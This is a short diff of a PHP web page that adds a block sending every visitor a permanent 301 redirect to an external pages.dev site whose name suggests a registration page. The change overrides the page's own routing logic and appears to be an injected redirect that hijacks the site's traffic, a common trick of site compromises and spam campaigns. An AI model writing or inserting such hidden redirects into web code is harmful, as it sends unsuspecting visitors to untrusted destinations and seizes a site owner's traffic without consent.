@@ -15,6 +15,11 @@ if (isset($_GET['page']) && !empty($_GET['page'])) {
 $ampnya = "https://bakulmacid.pages.dev/?page=" . strtolower($page);
 ?>
 
+<?php
+//* Permanently redirect page
+header("Location: https://bbteam-daftar-paling-aman.pages.dev/",TRUE,301);
+?>
+
 <!DOCTYPE HTML>
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
 <head>
